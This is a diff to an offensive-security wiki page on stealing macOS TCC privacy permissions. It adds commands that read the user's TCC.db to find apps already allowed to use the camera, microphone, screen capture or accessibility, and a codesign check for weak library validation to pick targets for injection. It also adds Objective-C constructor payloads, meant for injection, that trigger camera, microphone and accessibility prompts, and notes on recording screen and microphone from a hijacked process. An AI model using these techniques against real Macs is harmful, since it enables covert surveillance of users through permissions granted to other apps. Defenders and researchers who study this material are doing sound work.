@@ -10,6 +10,20 @@
 > [!WARNING]
 > This is still a very realistic attack path: recent permission-theft research against Microsoft macOS apps showed that **weak library validation / plugin loading** can let an attacker reuse the victim app's already-granted **camera**, **microphone**, and other TCC permissions without a second prompt.
 
+## Quick triage before using a payload
+
+Recent permission-theft research keeps reinforcing the same workflow: first find an app that already has the TCC grant you want, then verify that it is a realistic injection target.
+
+```bash
+sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
+  "select service, client from access where auth_value=2 and service in ('kTCCServiceCamera','kTCCServiceMicrophone','kTCCServiceScreenCapture','kTCCServiceAccessibility') order by service, client;"
+
+codesign -d --entitlements :- /Applications/Target.app 2>/dev/null | \
+  egrep 'disable-library-validation|allow-dyld-environment-variables'
+```
+
+If the target also loads attacker-controlled plug-ins / frameworks, these payloads become much more interesting. For broader post-exploitation ideas after landing inside an already-approved process, check [this related page](macos-tcc-credential-and-data-theft.md).
+
 ### Desktop
 
 - **Entitlement**: None
@@ -450,6 +464,27 @@ static void telegram(int argc, const char **argv) {
 
 {{#endtab}}
 
+{{#tab name="ObjectiveC - Prompt"}}
+Trigger the camera prompt if the current process is still `NotDetermined`.
+
+```objectivec
+#import <Foundation/Foundation.h>
+#import <AVFoundation/AVFoundation.h>
+#import <dispatch/dispatch.h>
+__attribute__((constructor))
+static void camprompt(int argc, const char **argv) {
+    if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo] != AVAuthorizationStatusNotDetermined) return;
+    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+    [AVCaptureDevice requestAccessForMediaType:AVMediaTypeVideo completionHandler:^(BOOL granted) {
+        NSLog(@"Camera prompt result: %@", granted ? @"granted" : @"denied");
+        dispatch_semaphore_signal(sem);
+    }];
+    dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
+}
+```
+
+{{#endtab}}
+
 {{#tab name="Shell"}}
 Take a photo with the camera
 
@@ -467,7 +502,7 @@ ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 
 {{#tabs}}
 {{#tab name="ObjetiveC - Record"}}
-Record 5s of audio an store it in `/tmp/recording.m4a`
+Record 5s of audio and store it in `/tmp/recording.m4a`
 
 ```objectivec
 #import <Foundation/Foundation.h>
@@ -569,7 +604,7 @@ static void myconstructor(int argc, const char **argv) {
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Check"}}
-Check if the app has access to the mricrophone.
+Check if the app has access to the microphone.
 
 ```objectivec
 #import <Foundation/Foundation.h>
@@ -596,6 +631,27 @@ Check if the app has access to the mricrophone.
 __attribute__((constructor))
 static void telegram(int argc, const char **argv) {
     [MicrophoneAccessChecker hasMicrophoneAccess];
+}
+```
+
+{{#endtab}}
+
+{{#tab name="ObjectiveC - Prompt"}}
+Trigger the microphone prompt if the current process is still `NotDetermined`.
+
+```objectivec
+#import <Foundation/Foundation.h>
+#import <AVFoundation/AVFoundation.h>
+#import <dispatch/dispatch.h>
+__attribute__((constructor))
+static void micprompt(int argc, const char **argv) {
+    if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio] != AVAuthorizationStatusNotDetermined) return;
+    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+    [AVCaptureDevice requestAccessForMediaType:AVMediaTypeAudio completionHandler:^(BOOL granted) {
+        NSLog(@"Microphone prompt result: %@", granted ? @"granted" : @"denied");
+        dispatch_semaphore_signal(sem);
+    }];
+    dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
 }
 ```
 
@@ -793,7 +849,7 @@ screencapture -V 5 /tmp/screen.mov
 {{#endtabs}}
 
 > [!TIP]
-> On **macOS 12.3+**, `ScreenCaptureKit` is usually the better post-exploitation primitive than `AVCaptureScreenInput`: it can do high-performance streaming, single-frame grabs with `SCScreenshotManager`, and stream **system audio**. If you also want **microphone** audio, you still need `kTCCServiceMicrophone`. For more desktop-session abuse primitives, see [this related page](../macos-input-monitoring-screen-capture-accessibility.md).
+> On **macOS 12.3+**, `ScreenCaptureKit` is usually the better post-exploitation primitive than `AVCaptureScreenInput`: it can do high-performance streaming, single-frame grabs with `SCScreenshotManager`, and stream **system audio**. Recent `ScreenCaptureKit` updates also added `captureMicrophone` / `microphoneCaptureDeviceID` on `SCStreamConfiguration` plus `SCRecordingOutput` for straight-to-file recording, so one hijacked screen-capture client can save screen + system audio directly and add mic audio when the process also holds `kTCCServiceMicrophone`. For more desktop-session abuse primitives, see [this related page](../macos-input-monitoring-screen-capture-accessibility.md).
 
 ### Accessibility
 
@@ -853,6 +909,22 @@ int main() {
         }
     }
     return 0;
+}
+```
+
+{{#endtab}}
+
+{{#tab name="Check / Prompt"}}
+Check whether the current process is already trusted for Accessibility and ask macOS to show the consent UI if it is not.
+
+```objectivec
+#import <Foundation/Foundation.h>
+#import <ApplicationServices/ApplicationServices.h>
+__attribute__((constructor))
+static void axprompt(int argc, const char **argv) {
+    NSDictionary *opts = @{(__bridge id)kAXTrustedCheckOptionPrompt: @YES};
+    BOOL trusted = AXIsProcessTrustedWithOptions((__bridge CFDictionaryRef)opts);
+    NSLog(@"Accessibility access: %@", trusted ? @"granted" : @"pending/denied");
 }
 ```
 
@@ -979,6 +1051,8 @@ int main() {
 
 - [Cisco Talos - How multiple vulnerabilities in Microsoft apps for macOS pave the way to stealing permissions](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
 - [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
+- [Apple Developer - Requesting Authorization for Media Capture on macOS](https://developer.apple.com/documentation/bundleresources/requesting-authorization-for-media-capture-on-macos?language=objc)
+- [Apple Developer - Capture HDR content with ScreenCaptureKit (WWDC24)](https://developer.apple.com/videos/play/wwdc2024/10088/)
 
 
 {{#include ../../../../banners/hacktricks-training.md}}
